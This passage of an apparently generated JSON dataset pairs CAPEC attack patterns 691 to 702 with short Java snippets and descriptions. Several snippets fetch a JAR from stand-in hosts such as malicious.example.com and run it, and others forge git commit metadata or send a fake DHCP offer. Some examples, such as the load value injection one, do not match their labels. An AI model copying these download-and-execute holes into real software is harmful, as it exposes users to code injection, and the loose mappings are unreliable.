        "description": "This Java code snippet demonstrates a scenario where metadata spoofing can occur. The code downloads a JAR file from a remote URL without performing any integrity checks (CWE-494). It then loads and executes a class from the downloaded JAR file, assuming it is legitimate. This can lead to the execution of malicious code if an attacker has spoofed the metadata to make the malicious resource appear credible. The code also touches on other related weaknesses, such as using a less trusted source (CWE-348), potential for authentication bypass by spoofing (CWE-290), incorrectly specified destination in a communication channel (CWE-941), and exposure of sensitive information through metadata (CWE-1230)."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        String url = \"http://example.com/malicious-library.jar\";\n        String fileName = \"malicious-library.jar\";\n        try {\n            downloadFile(url, fileName);\n            loadLibrary(fileName);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadFile(String url, String fileName) throws IOException {\n        try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());\n             FileOutputStream fileOutputStream = new FileOutputStream(fileName)) {\n            byte dataBuffer[] = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {\n                fileOutputStream.write(dataBuffer, 0, bytesRead);\n            }\n        }\n    }\n\n    public static void loadLibrary(String fileName) throws Exception {\n        File file = new File(fileName);\n        URL url = file.toURI().toURL();\n        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});\n        Class<?> cls = classLoader.loadClass(\"com.example.MaliciousClass\");\n        cls.getDeclaredMethod(\"execute\").invoke(null);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software update mechanism that embodies the CAPEC 'Spoof Open-Source Software Metadata'. The code downloads a JAR file from a specified URL and loads it without verifying its integrity or origin (CWE-494). The downloaded file could be from a less trusted source (CWE-348) and may contain embedded malicious code (CWE-506). The code also implicitly depends on the third-party component being secure, which may not be the case (CWE-1395). This example highlights the risks of downloading and executing code without proper security checks, making it susceptible to spoofing and other attacks."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableVCS {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious-repo.zip\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"repo.zip\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // Unzip the downloaded repository (CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere)\n            Process unzipProcess = Runtime.getRuntime().exec(\"unzip repo.zip -d /path/to/repo\");\n            unzipProcess.waitFor();\n\n            // CWE-348: Use of Less Trusted Source\n            File repoDir = new File(\"/path/to/repo\");\n            if (repoDir.exists()) {\n                System.out.println(\"Repository downloaded and extracted.\");\n            }\n\n            // Simulate spoofing commit metadata (CAPEC-163)\n            File commitFile = new File(\"/path/to/repo/.git/COMMIT_EDITMSG\");\n            FileWriter writer = new FileWriter(commitFile);\n            writer.write(\"Author: Trusted Developer <trusted@example.com>\\n\");\n            writer.write(\"Date: Mon, 1 Jan 2023 12:00:00 +0000\\n\");\n            writer.write(\"\\n\");\n            writer.write(\"Fake commit message\\n\");\n            writer.close();\n\n            System.out.println(\"Commit metadata spoofed.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can spoof version control system (VCS) commit metadata to deceive users. The code downloads a repository from a remote location without verifying its integrity (CWE-494), extracts it to a local directory (CWE-527), and uses a less trusted source (CWE-348). It then simulates the spoofing of commit metadata by writing fake commit information to the .git/COMMIT_EDITMSG file. This represents the main idea of CAPEC-163, where an adversary manipulates VCS metadata to make malicious software appear legitimate and frequently maintained."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        String url = \"http://example.com/malicious-package.jar\";\n        String fileName = \"malicious-package.jar\";\n        try {\n            downloadFile(url, fileName);\n            Runtime.getRuntime().exec(\"java -jar \" + fileName);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadFile(String url, String fileName) throws IOException {\n        try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());\n             FileOutputStream fileOutputStream = new FileOutputStream(fileName)) {\n            byte dataBuffer[] = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {\n                fileOutputStream.write(dataBuffer, 0, bytesRead);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software downloader that embodies the concept of 'StarJacking'. The code downloads a JAR file from a specified URL and executes it without performing any integrity checks or verifying the source. This represents CWE-494 (Download of Code Without Integrity Check) and CWE-348 (Use of Less Trusted Source). The downloaded file could contain malicious code (CWE-506), and the lack of verification makes it easy for an adversary to spoof the software's popularity or trustworthiness. This snippet highlights the risks associated with downloading and executing code from untrusted sources, which can lead to the execution of malicious code."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "import java.util.TimeZone;\nimport java.util.Locale;\nimport java.util.Properties;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class SystemLocationDiscovery {\n    public static void main(String[] args) {\n        // Collecting system timezone\n        TimeZone timeZone = TimeZone.getDefault();\n        System.out.println(\"System Timezone: \" + timeZone.getID());\n\n        // Collecting system locale\n        Locale locale = Locale.getDefault();\n        System.out.println(\"System Locale: \" + locale.getDisplayName());\n\n        // Collecting sensitive system properties\n        Properties properties = new Properties();\n        try {\n            properties.load(new FileInputStream(\"/path/to/sensitive/system.properties\"));\n            System.out.println(\"Sensitive System Property: \" + properties.getProperty(\"sensitive.key\"));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'System Location Discovery' by collecting and printing the system's timezone and locale information. Additionally, it attempts to load and print a sensitive system property from a file, which represents the CWE-497 'Exposure of Sensitive System Information to an Unauthorized Control Sphere'. The code highlights how an adversary might gather geographical and sensitive system information to confirm the target and tailor further attacks. The use of a file path to access sensitive properties also touches on CWE-529 'Exposure of Access Control List Files to an Unauthorized Control Sphere'."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class RepoJackingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious-repo.jar\");\n            InputStream in = url.openStream();\n            Files.copy(in, Paths.get(\"malicious-repo.jar\"), StandardCopyOption.REPLACE_EXISTING);\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new URL(\"file:malicious-repo.jar\")});\n            Class<?> clazz = classLoader.loadClass(\"com.malicious.MaliciousClass\");\n            Runnable maliciousCode = (Runnable) clazz.getDeclaredConstructor().newInstance();\n            maliciousCode.run();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an application downloads a JAR file from a remote URL without verifying its integrity (CWE-494). It then loads and executes a class from this untrusted JAR file (CWE-829). This embodies the concept of 'Repo Jacking' where an adversary can trick users into incorporating malicious code into their applications by exploiting the redirect property of directly linked VCS repositories. The code highlights the risks of downloading and executing code from untrusted sources, which can lead to the inclusion of malicious functionality."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "import java.nio.ByteBuffer;\nimport java.security.SecureRandom;\n\npublic class LoadValueInjectionExample {\n    private static final int BUFFER_SIZE = 64;\n    private static final SecureRandom random = new SecureRandom();\n\n    public static void main(String[] args) {\n        ByteBuffer buffer = ByteBuffer.allocate(BUFFER_SIZE);\n        byte[] secretData = new byte[BUFFER_SIZE];\n        random.nextBytes(secretData);\n\n        // Simulate a page fault or microcode assist\n        try {\n            // This is where the transient execution would occur\n            transientExecution(buffer, secretData);\n        } catch (Exception e) {\n            // Handle the fault\n            System.out.println(\"Page fault or microcode assist occurred\");\n        }\n    }\n\n    private static void transientExecution(ByteBuffer buffer, byte[] secretData) throws Exception {\n        // Simulate incorrect data forwarding during transient execution\n        for (int i = 0; i < BUFFER_SIZE; i++) {\n            buffer.put(i, secretData[i]);\n        }\n\n        // Simulate side-channel analysis to extract secret data\n        for (int i = 0; i < BUFFER_SIZE; i++) {\n            byte leakedByte = buffer.get(i);\n            System.out.printf(\"Leaked byte: %02x\\n\", leakedByte);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of Load Value Injection (LVI) by simulating transient execution and side-channel analysis. The code allocates a buffer and fills it with random secret data. It then simulates a page fault or microcode assist, which would trigger transient execution. During this transient execution, incorrect data forwarding is simulated by copying secret data into the buffer. Finally, the code simulates a side-channel analysis by reading and printing the leaked bytes from the buffer. This example embodies the main idea of LVI, where an adversary exploits transient execution to access sensitive information."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class DHCPSpoofing {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        byte[] dhcpOffer = createDHCPOffer();\n        InetAddress targetAddress = InetAddress.getByName(\"192.168.1.100\");\n        DatagramPacket packet = new DatagramPacket(dhcpOffer, dhcpOffer.length, targetAddress, 68);\n        socket.send(packet);\n        socket.close();\n    }\n\n    private static byte[] createDHCPOffer() {\n        // Simplified DHCP offer packet\n        byte[] offer = new byte[240];\n        offer[0] = 2; // Message type: Boot Reply (2)\n        offer[1] = 1; // Hardware type: Ethernet\n        offer[2] = 6; // Hardware address length: 6\n        offer[3] = 0; // Hops: 0\n        // Transaction ID, seconds elapsed, flags, client IP, your IP, server IP, gateway IP, client hardware address, etc.\n        // For simplicity, these fields are not fully populated\n        return offer;\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of DHCP spoofing. The code creates a fake DHCP offer packet and sends it to a target IP address (192.168.1.100) on the local network. The `createDHCPOffer` method constructs a simplified DHCP offer packet. The main method uses a `DatagramSocket` to send this packet to the target address on port 68, which is the standard port for DHCP client communication. This code embodies the main idea of CAPEC-290 (DHCP Spoofing) by showing how an adversary can masquerade as a legitimate DHCP server to redirect network traffic or deny service. The related CWEs are represented by the lack of proper endpoint verification (CWE-923), reliance on IP address for communication (CWE-291), and potential for authentication bypass (CWE-290)."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousExtension {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious.example.com/malicious.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"malicious.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(\"malicious.jar\").toURI().toURL()});\n            Class<?> clazz = classLoader.loadClass(\"com.malicious.MaliciousClass\");\n            Runnable maliciousCode = (Runnable) clazz.getDeclaredConstructor().newInstance();\n\n            // CWE-507: Trojan Horse\n            System.out.println(\"Installing useful extension...\");\n            maliciousCode.run(); // Hidden malicious functionality\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Install Malicious Extension' by downloading and executing a malicious JAR file. The code first downloads the JAR file from a remote URL without performing any integrity checks (CWE-494). It then loads a class from the downloaded JAR file, which is outside the trusted control sphere (CWE-829). Finally, it runs the malicious code under the guise of installing a useful extension, representing a Trojan Horse (CWE-507). This snippet embodies the main idea of tricking a user into installing a malicious extension that performs hidden malicious actions."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "import java.awt.GraphicsDevice;\nimport java.awt.GraphicsEnvironment;\nimport java.awt.Robot;\nimport java.awt.image.BufferedImage;\nimport javax.imageio.ImageIO;\nimport java.io.File;\nimport java.io.IOException;\n\npublic class ScreenCapture {\n    public static void main(String[] args) {\n        try {\n            // Get the screen device\n            GraphicsDevice screen = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();\n            Robot robot = new Robot(screen);\n            // Capture the screen\n            BufferedImage screenShot = robot.createScreenCapture(screen.getDefaultConfiguration().getBounds());\n            // Save the captured image to a file\n            ImageIO.write(screenShot, \"png\", new File(\"screenshot.png\"));\n            System.out.println(\"Screen captured and saved as screenshot.png\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet captures the content of the screen and saves it as an image file. The code uses the `Robot` class to take a screenshot of the default screen device and saves it as 'screenshot.png'. This represents the CAPEC 'Eavesdropping on a Monitor' by demonstrating how an attacker could capture screen content without modifying any cables or installing software on the target machine. The code indirectly touches on CWE-1300 (Improper Protection of Physical Side Channels) by showing how screen data can be captured through software means, which could be extended to physical side channels. It also relates to CWE-319 (Cleartext Transmission of Sensitive Information) as the captured screen data is stored in an unprotected file, and CWE-1323 (Improper Management of Sensitive Trace Data) as the screenshot could contain sensitive information that is not properly managed or protected."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class NetworkBoundaryBridging {\n    public static void main(String[] args) {\n        try {\n            // Establish a connection to a trusted network\n            Socket trustedSocket = new Socket(\"trusted-network.com\", 8080);\n            DataOutputStream trustedOut = new DataOutputStream(trustedSocket.getOutputStream());\n            DataInputStream trustedIn = new DataInputStream(trustedSocket.getInputStream());\n\n            // Establish a connection to an untrusted network\n            Socket untrustedSocket = new Socket(\"untrusted-network.com\", 9090);\n            DataOutputStream untrustedOut = new DataOutputStream(untrustedSocket.getOutputStream());\n            DataInputStream untrustedIn = new DataInputStream(untrustedSocket.getInputStream());\n\n            // Improperly bridge the trusted and untrusted networks\n            String messageFromTrusted = trustedIn.readUTF();\n            untrustedOut.writeUTF(messageFromTrusted); // CWE-923: No endpoint verification\n\n            String messageFromUntrusted = untrustedIn.readUTF();\n            trustedOut.writeUTF(messageFromUntrusted); // CWE-501: Mixing trusted and untrusted data\n\n            // Close connections\n            trustedSocket.close();\n            untrustedSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary bridges a trusted network and an untrusted network using a network boundary device. The code establishes two separate socket connections: one to a trusted network and another to an untrusted network. It then improperly forwards messages between these two networks without verifying the endpoints (CWE-923) and mixes trusted and untrusted data (CWE-501). This represents the main idea of the CAPEC 'Network Boundary Bridging', where an adversary exploits network boundary devices to create a channel between trusted and untrusted networks, potentially leading to security breaches."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableRemoteDesktopServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = request.getParameter(\"targetUrl\");\n        if (targetUrl == null || !targetUrl.startsWith(\"http\")) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid URL\");\n            return;\n        }\n\n        URL url = new URL(targetUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n\n        InputStream inputStream = connection.getInputStream();\n        OutputStream outputStream = response.getOutputStream();\n\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = inputStream.read(buffer)) != -1) {\n            outputStream.write(buffer, 0, bytesRead);\n        }\n\n        inputStream.close();\n        outputStream.close();\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of a remote desktop session in a web application. The servlet accepts a 'targetUrl' parameter from the client, which specifies the URL of the remote desktop session to be accessed. The servlet then establishes a connection to the specified URL and streams the content back to the client.\n\nThe code is vulnerable to several issues:\n1. **CWE-294: Authentication Bypass by Capture-replay** - The servlet does not implement any authentication mechanism, allowing an attacker to replay requests to access the remote desktop session.\n2. **CWE-345: Insufficient Verification of Data Authenticity** - The servlet does not verify the authenticity of the 'targetUrl' parameter, potentially allowing an attacker to specify a malicious URL.\n3. **CWE-602: Client-Side Enforcement of Server-Side Security** - The servlet relies on the client to provide a valid 'targetUrl', without server-side validation.\n4. **CWE-830: Inclusion of Web Functionality from an Untrusted Source** - The servlet includes web functionality from an untrusted source by connecting to the 'targetUrl' provided by the client, which could lead to the execution of malicious code within the client's browser.\n\nThis code snippet embodies the main idea of the CAPEC 'Browser in the Middle (BiTM)' by demonstrating how an adversary can exploit a web browser to establish a remote desktop connection to an adversary's system, leveraging the related CWEs to highlight the vulnerabilities in the implementation."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "public class DebugComponent {\n    private boolean isAuthorized;\n    private boolean debugMode;\n    private int sensitiveData;\n\n    public DebugComponent(boolean isAuthorized) {\n        this.isAuthorized = isAuthorized;\n        this.debugMode = false;\n        this.sensitiveData = 12345; // Example sensitive data\n    }\n\n    public void enableDebugMode() {\n        if (isAuthorized) {\n            debugMode = true;\n            System.out.println(\"Debug mode enabled.\");\n        } else {\n            System.out.println(\"Unauthorized access attempt to enable debug mode.\");\n        }\n    }\n\n    public void accessSensitiveData() {\n        if (debugMode) {\n            System.out.println(\"Accessing sensitive data: \" + sensitiveData);\n        } else {\n            System.out.println(\"Debug mode not enabled. Cannot access sensitive data.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        DebugComponent component = new DebugComponent(true); // Authorized user\n        component.enableDebugMode();\n        component.accessSensitiveData();\n\n        DebugComponent unauthorizedComponent = new DebugComponent(false); // Unauthorized user\n        unauthorizedComponent.enableDebugMode();\n        unauthorizedComponent.accessSensitiveData();\n    }\n}",
        "description": "This Java code snippet represents a simplified version of a hardware debug component with access control mechanisms. The `DebugComponent` class has a constructor that sets the authorization status of the user. The `enableDebugMode` method checks if the user is authorized before enabling debug mode. The `accessSensitiveData` method allows access to sensitive data only if debug mode is enabled. This code embodies the main idea of CAPEC-Exploiting Incorrect Chaining or Granularity of Hardware Debug Components by demonstrating how improper access control can lead to unauthorized access to debug functionality. The related CWEs are represented by the need for proper authorization checks (CWE-1191), handling of sensitive data (CWE-1323), and ensuring that debug functionality is correctly managed (CWE-1296)."
    }
]